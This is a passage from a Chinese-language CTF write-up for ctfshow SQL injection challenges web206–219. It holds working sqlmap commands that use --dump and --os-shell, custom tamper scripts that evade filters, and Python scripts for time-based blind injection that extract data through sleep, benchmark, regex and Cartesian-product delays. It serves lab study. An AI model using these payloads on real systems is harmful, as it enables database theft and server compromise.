title="web206"></a>web206</h2><blockquote><p>sql需要闭合</p></blockquote><p>查询语句</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;拼接sql语句查找指定ID用户$sql &#x3D; &quot;select id,username,pass from ctfshow_user where id &#x3D; (&#39;&quot;.$id.&quot;&#39;) limit 0,1;&quot;;      </code></pre><p>返回逻辑</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;对传入的参数进行了过滤  function waf($str)&#123;   &#x2F;&#x2F;代码过于简单，不宜展示  &#125;   </code></pre><p>sqlmap会自动给你把语句闭合的，所以可以继续用上一题的payload</p><pre class="language-txt" data-language="txt"><code class="language-txt">python sqlmap.py -u &quot;http:&#x2F;&#x2F;191dbe2e-0be0-4de8-aa21-666eda4b7951.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --referer&#x3D;&quot;ctf.show&quot; --dump --batch --no-cast --cookie&#x3D;&quot;PHPSESSID&#x3D;b5cvb96c8fol1ev4rbbkp6p88d&quot; --method&#x3D;&quot;PUT&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;191dbe2e-0be0-4de8-aa21-666eda4b7951.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220510183308961.png" alt="image-20220510183308961"></p><h2 id="web207"><a href="#web207" class="headerlink" title="web207"></a>web207</h2><blockquote><p>--tamper 的初体验</p></blockquote><p>查询语句</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;拼接sql语句查找指定ID用户$sql &#x3D; &quot;select id,username,pass from ctfshow_user where id &#x3D; (&#39;&quot;.$id.&quot;&#39;) limit 0,1;&quot;;</code></pre><p>返回逻辑</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;对传入的参数进行了过滤  function waf($str)&#123;   return preg_match(&#39;&#x2F; &#x2F;&#39;, $str);  &#125;</code></pre><p>过滤了空格</p><p>sqlmap提供了tamper脚本用于应对此种情况，tamper的出现是为了引入用户自定义的脚本来修改payload以达到绕过waf的目的。sqlmap自带的tamper脚本文件都在sqlmap的tamper文件夹下</p><pre class="language-txt" data-language="txt"><code class="language-txt">举例如下tamper脚本：apostrophemask.py 用utf8代替引号equaltolike.py MSSQL * SQLite中like 代替等号greatest.py MySQL中绕过过滤’&gt;’ ,用GREATEST替换大于号space2hash.py 空格替换为#号 随机字符串 以及换行符space2comment.py 用&#x2F;**&#x2F;代替空格apostrophenullencode.py MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL绕过过滤双引号，替换字符和双引号halfversionedmorekeywords.py 当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论space2morehash.py MySQL中空格替换为 #号 以及更多随机字符串 换行符appendnullbyte.p Microsoft Access在有效负荷结束位置加载零字节字符编码ifnull2ifisnull.py MySQL，SQLite (possibly)，SAP MaxDB绕过对 IFNULL 过滤space2mssqlblank.py mssql空格替换为其它空符号base64encode.py 用base64编码space2mssqlhash.py mssql查询中替换空格modsecurityversioned.py mysql中过滤空格，包含完整的查询版本注释space2mysqlblank.py mysql中空格替换其它空白符号between.py MS SQL 2005，MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0中用between替换大于号（&gt;）space2mysqldash.py MySQL，MSSQL替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）multiplespaces.py 围绕SQL关键字添加多个空格space2plus.py 用+替换空格bluecoat.py MySQL 5.1, SGOS代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换&#x3D;为likenonrecursivereplacement.py 双重查询语句。取代predefined SQL关键字with表示 suitable for替代space2randomblank.py 代替空格字符（“”）从一个随机的空白字符可选字符的有效集sp_password.py 追加sp_password’从DBMS日志的自动模糊处理的26 有效载荷的末尾chardoubleencode.py 双url编码(不处理以编码的)unionalltounion.py 替换UNION ALL SELECT UNION SELECTcharencode.py Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL 8.3, 8.4, 9.0url编码；randomcase.py Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL 8.3, 8.4, 9.0中随机大小写unmagicquotes.py 宽字符绕过 GPC addslashesrandomcomments.py 用&#x2F;**&#x2F;分割sql关键字charunicodeencode.py ASP，ASP.NET中字符串 unicode 编码securesphere.py 追加特制的字符串versionedmorekeywords.py MySQL &gt;&#x3D; 5.1.13注释绕过halfversionedmorekeywords.py MySQL &lt; 5.1中关键字前加注释</code></pre><p>对于本题，过滤了空格，我们可以使用tamper文件夹下的space2comment.py文件，payload为</p><pre class="language-txt" data-language="txt"><code class="language-txt">python sqlmap.py -u &quot;http:&#x2F;&#x2F;f0b03390-e045-4d1a-ba12-80ead13bd7c4.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --referer&#x3D;&quot;ctf.show&quot; --dump --batch --no-cast --cookie&#x3D;&quot;PHPSESSID&#x3D;b5cvb96c8fol1ev4rbbkp6p88d&quot; --method&#x3D;&quot;PUT&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;f0b03390-e045-4d1a-ba12-80ead13bd7c4.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;space2comment</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220510222235981.png" alt="image-20220510222235981"></p><h2 id="web208"><a href="#web208" class="headerlink" title="web208"></a>web208</h2><blockquote><p>-tamper 的2体验</p></blockquote><p>查询语句</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;拼接sql语句查找指定ID用户$sql &#x3D; &quot;select id,username,pass from ctfshow_user where id &#x3D; (&#39;&quot;.$id.&quot;&#39;) limit 0,1;&quot;;      </code></pre><p>返回逻辑</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;对传入的参数进行了过滤&#x2F;&#x2F; $id &#x3D; str_replace(&#39;select&#39;, &#39;&#39;, $id);  function waf($str)&#123;   return preg_match(&#39;&#x2F; &#x2F;&#39;, $str);  &#125; </code></pre><p>select被替换为空白，但是这里只过滤了小写，而sqlmap里用的一般都是大写</p><pre class="language-none"><code class="language-none">python sqlmap.py -u &quot;http:&#x2F;&#x2F;3edc67ff-a1b2-4540-9a32-d9672278fc57.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --referer&#x3D;&quot;ctf.show&quot; --dump --batch --no-cast --cookie&#x3D;&quot;PHPSESSID&#x3D;b5cvb96c8fol1ev4rbbkp6p88d&quot; --method&#x3D;&quot;PUT&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;3edc67ff-a1b2-4540-9a32-d9672278fc57.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;space2comment</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220510223034551.png" alt="image-20220510223034551"></p><p>看，确实是大写的select</p><p>但是这道题是要考tamper脚本的编写</p><p>贴下y4师傅的</p><p><a href="https://y4er.com/post/sqlmap-tamper/">https://y4er.com/post/sqlmap-tamper/</a></p><pre class="language-py" data-language="py"><code class="language-py">#!&#x2F;usr&#x2F;bin&#x2F;env python&quot;&quot;&quot;Author:Y4tacker&quot;&quot;&quot;from lib.core.compat import xrangefrom lib.core.enums import PRIORITY__priority__ &#x3D; PRIORITY.LOWdef tamper(payload, **kwargs):    payload &#x3D; space2comment(payload)    return payloaddef space2comment(payload):    retVal &#x3D; payload    if payload:        retVal &#x3D; &quot;&quot;        quote, doublequote, firstspace &#x3D; False, False, False        for i in xrange(len(payload)):            if not firstspace:                if payload[i].isspace():                    firstspace &#x3D; True                    retVal +&#x3D; chr(0x0a)                    continue            elif payload[i] &#x3D;&#x3D; &#39;\&#39;&#39;:                quote &#x3D; not quote            elif payload[i] &#x3D;&#x3D; &#39;&quot;&#39;:                doublequote &#x3D; not doublequote            elif payload[i] &#x3D;&#x3D; &quot; &quot; and not doublequote and not quote:                retVal +&#x3D; chr(0x0a)                continue            retVal +&#x3D; payload[i]    return retVal</code></pre><h2 id="web209"><a href="#web209" class="headerlink" title="web209"></a>web209</h2><blockquote><p>--tamper 的3体验</p></blockquote><p>查询语句</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;拼接sql语句查找指定ID用户$sql &#x3D; &quot;select id,username,pass from ctfshow_user where id &#x3D; &#39;&quot;.$id.&quot;&#39; limit 0,1;&quot;;      </code></pre><p>返回逻辑</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;对传入的参数进行了过滤  function waf($str)&#123;   &#x2F;&#x2F;TODO 未完工   return preg_match(&#39;&#x2F; |\*|\&#x3D;&#x2F;&#39;, $str);  &#125;</code></pre><p>这题需要将空格和<code>*</code>，<code>=</code>替换，自己写一个tamper</p><p>(还没学会，我是废物www</p><pre class="language-python" data-language="python"><code class="language-python">#!&#x2F;usr&#x2F;bin&#x2F;env python&quot;&quot;&quot;Author:Y4tacker&quot;&quot;&quot;from lib.core.compat import xrangefrom lib.core.enums import PRIORITY__priority__ &#x3D; PRIORITY.LOWdef tamper(payload, **kwargs):    payload &#x3D; space2comment(payload)    return payloaddef space2comment(payload):    retVal &#x3D; payload    if payload:        retVal &#x3D; &quot;&quot;        quote, doublequote, firstspace &#x3D; False, False, False        for i in xrange(len(payload)):            if not firstspace:                if payload[i].isspace():                    firstspace &#x3D; True                    retVal +&#x3D; chr(0x0a)                    continue            elif payload[i] &#x3D;&#x3D; &#39;\&#39;&#39;:                quote &#x3D; not quote            elif payload[i] &#x3D;&#x3D; &#39;&quot;&#39;:                doublequote &#x3D; not doublequote            elif payload[i] &#x3D;&#x3D; &quot;*&quot;:                retVal +&#x3D; chr(0x31)                continue            elif payload[i] &#x3D;&#x3D; &quot;&#x3D;&quot;:                retVal +&#x3D; chr(0x0a)+&#39;like&#39;+chr(0x0a)                continue            elif payload[i] &#x3D;&#x3D; &quot; &quot; and not doublequote and not quote:                retVal +&#x3D; chr(0x0a)                continue            retVal +&#x3D; payload[i]    return retVal</code></pre><p>payload</p><pre class="language-txt" data-language="txt"><code class="language-txt">python sqlmap.py -u &quot;http:&#x2F;&#x2F;a0b33203-ce0f-492c-8058-7ee5ba5e6149.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --referer&#x3D;&quot;ctf.show&quot; --dump --batch --no-cast --cookie&#x3D;&quot;PHPSESSID&#x3D;b5cvb96c8fol1ev4rbbkp6p88d&quot; --method&#x3D;&quot;PUT&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;a0b33203-ce0f-492c-8058-7ee5ba5e6149.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;web209</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220510223906906.png" alt="image-20220510223906906"></p><h2 id="web210"><a href="#web210" class="headerlink" title="web210"></a>web210</h2><blockquote><p>--tamper 的4体验</p></blockquote><p>查询语句</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;拼接sql语句查找指定ID用户$sql &#x3D; &quot;select id,username,pass from ctfshow_user where id &#x3D; &#39;&quot;.$id.&quot;&#39; limit 0,1;&quot;;      </code></pre><p>返回逻辑</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;对查询字符进行解密  function decode($id)&#123;    return strrev(base64_decode(strrev(base64_decode($id))));  &#125;</code></pre><p>对内容先base64解码然后逆序再base64解码再逆序</p><p>tamper:</p><pre class="language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python&quot;&quot;&quot;Copyright (c) 2006-2021 sqlmap developers (http:&#x2F;&#x2F;sqlmap.org&#x2F;)See the file &#39;LICENSE&#39; for copying permission&quot;&quot;&quot;from lib.core.enums import PRIORITYfrom lib.core.common import singleTimeWarnMessageimport base64__priority__ &#x3D; PRIORITY.LOWdef dependencies():    singleTimeWarnMessage(&quot;别套了别套了&quot;)def tamper(payload, **kwargs):    retVal &#x3D; payload    if payload:        retVal &#x3D; retVal.encode()        retVal &#x3D; retVal[::-1]        retVal &#x3D; base64.b64encode(retVal)        retVal &#x3D; retVal[::-1]        retVal &#x3D; base64.b64encode(retVal)        retVal &#x3D; retVal.decode()    return retVal</code></pre><h2 id="web211"><a href="#web211" class="headerlink" title="web211"></a>web211</h2><p>多过滤了一个空格</p><pre class="language-none"><code class="language-none">  function decode($id)&#123;    return strrev(base64_decode(strrev(base64_decode($id))));  &#125;function waf($str)&#123;    return preg_match(&#39;&#x2F; &#x2F;&#39;, $str);&#125;</code></pre><p>tamper</p><pre class="language-python" data-language="python"><code class="language-python">from lib.core.enums import PRIORITYfrom lib.core.common import singleTimeWarnMessageimport base64__priority__ &#x3D; PRIORITY.LOWdef dependencies():    singleTimeWarnMessage(&quot;别套了别套了&quot;)def tamper(payload, **kwargs):    retVal &#x3D; payload    retVal &#x3D; retVal.replace(&quot; &quot;, &quot;&#x2F;**&#x2F;&quot;)    retVal &#x3D; retVal.encode()    retVal &#x3D; retVal[::-1]    retVal &#x3D; base64.b64encode(retVal)    retVal &#x3D; retVal[::-1]    retVal &#x3D; base64.b64encode(retVal)    retVal &#x3D; retVal.decode()    return retVal</code></pre><h2 id="web212"><a href="#web212" class="headerlink" title="web212"></a>web212</h2><pre class="language-none"><code class="language-none">&#x2F;&#x2F;对查询字符进行解密  function decode($id)&#123;    return strrev(base64_decode(strrev(base64_decode($id))));  &#125;function waf($str)&#123;    return preg_match(&#39;&#x2F; |\*&#x2F;&#39;, $str);&#125;</code></pre><p>比上一个又多过滤了一个星号</p><p>tamper：</p><pre class="language-none"><code class="language-none">from lib.core.enums import PRIORITYfrom lib.core.common import singleTimeWarnMessageimport base64__priority__ &#x3D; PRIORITY.LOWdef dependencies():    singleTimeWarnMessage(&quot;别套了别套了&quot;)def tamper(payload, **kwargs):    payload &#x3D; bypass(payload)    retVal &#x3D; payload    retVal &#x3D; retVal.encode()    retVal &#x3D; retVal[::-1]    retVal &#x3D; base64.b64encode(retVal)    retVal &#x3D; retVal[::-1]    retVal &#x3D; base64.b64encode(retVal)    retVal &#x3D; retVal.decode()    return retValdef bypass(payload):    retVal &#x3D; &quot;&quot;    for i in range(len(payload)):        if payload[i]&#x3D;&#x3D;&quot; &quot;:            retVal +&#x3D; chr(0x9)        else:            retVal +&#x3D; payload[i]    return retVal</code></pre><h2 id="web213"><a href="#web213" class="headerlink" title="web213"></a>web213</h2><p>这一题flag不在数据库中，因此需要利用–os-shell进行getshell</p><blockquote><p><strong>–os-shell</strong> 其本质是写入两个shell文件，其中一个可以命令执行，另一个则是可以让我们上传文件；<br>不过也是有限制的，上传文件我们需要受到两个条件的限制，一个是网站的绝对路径，另一个则是导入导出的权限</p><p>在mysql中，由 <strong>secure_file_priv</strong> 参数来控制导入导出权限，该参数后面为null时，则表示不允许导入导出；如果是一个文件夹，则表示仅能在这个文件夹中导入导出；如果参数后面为空，也就是没有值时，则表示在任何文件夹都能导入导出</p></blockquote><p>查询语句</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;拼接sql语句查找指定ID用户$sql &#x3D; &quot;select id,username,pass from ctfshow_user where id &#x3D; &#39;&quot;.$id.&quot;&#39; limit 0,1;&quot;;      </code></pre><p>返回逻辑</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;对查询字符进行解密  function decode($id)&#123;    return strrev(base64_decode(strrev(base64_decode($id))));  &#125;</code></pre><p>payload</p><pre class="language-txt" data-language="txt"><code class="language-txt">python sqlmap.py -u &quot;http:&#x2F;&#x2F;074b704a-f2a2-4352-bede-0ac63d9324ce.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --referer&#x3D;&quot;ctf.show&quot; --dump --batch --no-cast --cookie&#x3D;&quot;PHPSESSID&#x3D;b5cvb96c8fol1ev4rbbkp6p88d&quot; --method&#x3D;&quot;PUT&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;074b704a-f2a2-4352-bede-0ac63d9324ce.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;ctfshowweb213 --os-shell</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220510225713255.png" alt="image-20220510225713255"></p><h2 id="web214"><a href="#web214" class="headerlink" title="web214"></a>web214</h2><p>时间盲注，跑脚本就行了</p><p>懒得写了，抄一下作业</p><pre class="language-python" data-language="python"><code class="language-python">&quot;&quot;&quot;Author:Y4tacker&quot;&quot;&quot;import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;d23ee9e9-3e43-4b0a-b172-547561ea456d.chall.ctf.show&#x2F;api&#x2F;&quot;result &#x3D; &quot;&quot;i &#x3D; 0while True:    i &#x3D; i + 1    head &#x3D; 32    tail &#x3D; 127    while head &lt; tail:        mid &#x3D; (head + tail) &gt;&gt; 1        # 查数据库        # payload &#x3D; &quot;select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()&quot;        # 查列名字-id.flag        # payload &#x3D; &quot;select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagx&#39;&quot;        # 查数据        payload &#x3D; &quot;select flaga from ctfshow_flagx&quot;        data &#x3D; &#123;            &#39;ip&#39;: f&quot;if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),1)&quot;,            &#39;debug&#39;:&#39;0&#39;        &#125;        try:            r &#x3D; requests.post(url, data&#x3D;data, timeout&#x3D;1)            tail &#x3D; mid        except Exception as e:            head &#x3D; mid + 1    if head !&#x3D; 32:        result +&#x3D; chr(head)    else:        break    print(result)</code></pre><h2 id="web215"><a href="#web215" class="headerlink" title="web215"></a>web215</h2><p>用了单引号，也就是变成字符型注入了，记得闭合就行</p><pre class="language-python" data-language="python"><code class="language-python">&quot;&quot;&quot;Author:Y4tacker&quot;&quot;&quot;import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;4ba8a766-0fda-4c66-bdbc-0e3f0a9d57dc.chall.ctf.show&#x2F;api&#x2F;&quot;result &#x3D; &quot;&quot;i &#x3D; 0while True:    i &#x3D; i + 1    head &#x3D; 32    tail &#x3D; 127    while head &lt; tail:        mid &#x3D; (head + tail) &gt;&gt; 1        # 查数据库        # payload &#x3D; &quot;select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()&quot;        # 查列名字-id.flag        # payload &#x3D; &quot;select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagxc&#39;&quot;        # 查数据        payload &#x3D; &quot;select flagaa from ctfshow_flagxc&quot;        data &#x3D; &#123;            &#39;ip&#39;: f&quot;1&#39; or if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),1) and &#39;1&#39;&#x3D;&#39;1&quot;,            &#39;debug&#39;:&#39;0&#39;        &#125;        try:            r &#x3D; requests.post(url, data&#x3D;data, timeout&#x3D;1)            tail &#x3D; mid        except Exception as e:            head &#x3D; mid + 1    if head !&#x3D; 32:        result +&#x3D; chr(head)    else:        break    print(result)</code></pre><h2 id="web216"><a href="#web216" class="headerlink" title="web216"></a>web216</h2><pre class="language-none"><code class="language-none">where id &#x3D; from_base64($id);</code></pre><p>查询语句变成了这样</p><p>这题不能将base64编码之后的字符串作为payload传入，因为base64解码之后，SQL会当做一个字符串而不是一个语句</p><p>尝试闭合这个base64解码</p><pre class="language-python" data-language="python"><code class="language-python">&quot;&quot;&quot;Author:Y4tacker&quot;&quot;&quot;import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;0f3060ee-be00-4090-a8e7-fc0944779c24.chall.ctf.show&#x2F;api&#x2F;&quot;result &#x3D; &quot;&quot;i &#x3D; 0while True:    i &#x3D; i + 1    head &#x3D; 32    tail &#x3D; 127    while head &lt; tail:        mid &#x3D; (head + tail) &gt;&gt; 1        # 查数据库        # payload &#x3D; &quot;select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()&quot;        # 查列名字-id.flag        # payload &#x3D; &quot;select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagxcc&#39;&quot;        # 查数据        payload &#x3D; &quot;select flagaac from ctfshow_flagxcc&quot;        data &#x3D; &#123;            &#39;ip&#39;: f&quot;&#39;MQ&#x3D;&#x3D;&#39;) or if (ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),1&quot;,            &#39;debug&#39;:&#39;0&#39;        &#125;        try:            r &#x3D; requests.post(url, data&#x3D;data, timeout&#x3D;1)            tail &#x3D; mid        except Exception as e:            head &#x3D; mid + 1    if head !&#x3D; 32:        result +&#x3D; chr(head)    else:        break    print(result)</code></pre><h2 id="web217"><a href="#web217" class="headerlink" title="web217"></a>web217</h2><p>查询语句</p><pre class="language-none"><code class="language-none">where id &#x3D; ($id);      </code></pre><p>返回逻辑</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;屏蔽危险分子function waf($str)&#123;    return preg_match(&#39;&#x2F;sleep&#x2F;i&#39;,$str);&#125;   </code></pre><p>过滤了sleep，但是还有一个benchmark函数</p><p>MySQL有一个内置的BENCHMARK()函数，可以测试某些特定操作的执行速度。参数可以是需要执行的次数和表达式。表达式可以是任何的标量表达式，比如返回值是标量的子查询或者函数。该函数可以很方便地测试某些特定操作的性能<br>套神的测试：</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220510231229494.png" alt="image-20220510231229494"></p><p>但是这个误差会很大</p><p>运行一次md5的时间可太短了，但是benchmark就是运行114514 1145140次md5计算出来的时间</p><p>值得注意的是，时间是指客户端的经过时间，不是在服务器端的CPU时间。</p><p>因此这个在注入的时候，和服务器跟网速有关</p><p>可以借鉴了feng师傅的思路,使用了time.sleep函数使每请求一次延迟0.2秒，提高准确率，且每爆出一个字母后就再延迟1.2秒，以免服务器卡顿，这样每条请求之间间隔一定的时间，虽然爆起来比较慢，但是准确率可以说是100%，不至于受到服务器和网速的影响。</p><pre class="language-python" data-language="python"><code class="language-python">#@Auth：Sentimentimport requestsimport timeurl&#x3D;&quot;http:&#x2F;&#x2F;f563ebb3-cced-467b-b970-59f54fb5c9a0.challenge.ctf.show&#x2F;api&#x2F;index.php&quot;flag&#x3D;&#39;&#39;for i in range(50):    m&#x3D;32    n&#x3D;127    while 1:        mid&#x3D;(m+n)&#x2F;&#x2F;2        data&#x3D;&#123;        #&#39;ip&#39;:&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;&#125;,1))&lt;&#123;&#125;,benchmark(1000000,md5(1)),0)&quot;.format(i,mid),&#39;debug&#39;:&quot;0&quot; #ctfshow_flagxccb,ctfshow_info        #&#39;ip&#39;:&quot;if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagxccb&#39;),&#123;&#125;,1))&lt;&#123;&#125;,benchmark(1000000,md5(1)),0)&quot;.format(i,mid),&#39;debug&#39;:&quot;0&quot; #id,flagaabc,info        &#39;ip&#39;:&quot;if(ascii(substr((select flagaabc from ctfshow_flagxccb),&#123;&#125;,1))&lt;&#123;&#125;,benchmark(1000000,md5(1)),0)&quot;.format(i,mid),&#39;debug&#39;:&quot;0&quot; #ctfshow&#123;d0ec2f99-1463-480a-b2d0-f5bb3d464411&#125;        &#125;        #print(data)        try:           r &#x3D; requests.post(url&#x3D;url,data&#x3D;data,timeout&#x3D;0.5)           m&#x3D;mid        except:            n&#x3D;mid        if(m+1&#x3D;&#x3D;n):            flag+&#x3D;chr(m)            print(flag)            break        time.sleep(0.2)    time.sleep(1)</code></pre><h2 id="web218"><a href="#web218" class="headerlink" title="web218"></a>web218</h2><pre class="language-none"><code class="language-none">function waf($str)&#123;    return preg_match(&#39;&#x2F;sleep|benchmark&#x2F;i&#39;,$str);&#125;   </code></pre><p>benchmark也被过滤了</p><p>参考一下这两个</p><p><a href="https://www.cnblogs.com/forforever/p/13019703.html">https://www.cnblogs.com/forforever/p/13019703.html</a></p><p><a href="https://xz.aliyun.com/t/5505">SQL注入有趣姿势总结 - 先知社区 (aliyun.com)</a></p><p>1.sleep</p><p>2.benchmark</p><p>3.笛卡尔积</p><p>4.GET_LOCK() 加锁</p><p>5.RLIKE REGEXP正则匹配</p><p>使用rpad或者repeat构造长字符串，利用正则表达式控制延时</p><pre class="language-none"><code class="language-none">mysql&gt; select * from ctftable where if((concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;),1,1);+----+-------+--------+| id | user  | passwd |+----+-------+--------+|  1 | admin | passwd ||  2 | user  | pass   ||  3 | Lxxx  | 123456 |+----+-------+--------+3 rows in set (3.63 sec)</code></pre><pre class="language-python" data-language="python"><code class="language-python">import timeimport requestsurl &#x3D; &#39;http:&#x2F;&#x2F;3471a536-3547-4d4b-93c6-06020fab5ffe.challenge.ctf.show&#x2F;api&#x2F;index.php&#39;flag &#x3D; &#39;&#39;sleep_rep &#x3D; &quot;concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) rlike &#39;(a.*)+(a.*)+b&#39;&quot;for i in range(60):    lenth &#x3D; len(flag)    min,max &#x3D; 32,128    while True:        j &#x3D; min + (max-min)&#x2F;&#x2F;2        if(min &#x3D;&#x3D; j):            flag +&#x3D; chr(j)            print(flag)            break        payload &#x3D; &#123;&quot;ip&quot;:f&quot;&#39;&#39;) or if(ascii(substr((select group_concat(flagaac) from ctfshow_flagxc),&#123;i&#125;,1))&lt;&#123;j&#125;,&#123;sleep_rep&#125;,&#39;False&#39;)#&quot;                   ,&#39;debug&#39;:0&#125;        try:            r &#x3D; requests.post(url&#x3D;url,data&#x3D;payload,timeout&#x3D;0.5)            min &#x3D; j        except:            max &#x3D; j        time.sleep(0.2)</code></pre><h2 id="web219"><a href="#web219" class="headerlink" title="web219"></a>web219</h2><pre><code>//屏蔽危险分子function waf($str)&#123;    return preg_match(&#39;/sleep|benchmark|rlike/i&#39;,$str);&#125;   </code></pre><p>rlike也被过滤了，尝试用笛卡儿积</p><pre class="language-none"><code class="language-none">笛卡尔积(因为连接表是一个很耗时的操作)AxB&#x3D;A和B中每个元素的组合所组成的集合，就是连接表SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;select * from table_name A, table_name Bselect * from table_name A, table_name B，table_name Cselect count(*) from table_name A, table_name B，table_name C  表可以是同一张表</code></pre><p>Lxxx师傅的测试：</p><pre class="language-none"><code class="language-none">mysql&gt; SELECT count(*) FROM information_schema.columns A, information_schema.columns B;+----------+| count(*) |+----------+| 62805625 |+----------+1 row in set (1.74 sec)</code></pre><pre class="language-python" data-language="python"><code class="language-python">import requestsimport timeurl&#x3D;&#39;http:&#x2F;&#x2F;f6ad04f0-3fd9-4eb9-9dc9-78cfaa9f5000.challenge.ctf.show&#x2F;api&#x2F;index.php&#39;flag&#x3D;&#39;&#39;for i in range(60):    lenth &#x3D; len(flag)    min,max &#x3D; 32,128    while True:        j &#x3D; min + (max-min)&#x2F;&#x2F;2        if(min &#x3D;&#x3D; j):            flag +&#x3D; chr(j)            print(flag)            break        # payload&#x3D;f&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;i&#125;,1))&lt;&#123;j&#125;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),1)&quot;        # payload&#x3D;f&quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagxca&#39;),&#123;i&#125;,1))&lt;&#123;j&#125;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),1)&quot;        payload&#x3D;f&quot;if(ascii(substr((select group_concat(flagaabc) from ctfshow_flagxca),&#123;i&#125;,1))&lt;&#123;j&#125;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),1)&quot;        data&#x3D;&#123;            &#39;ip&#39;:payload,            &#39;debug&#39;:0        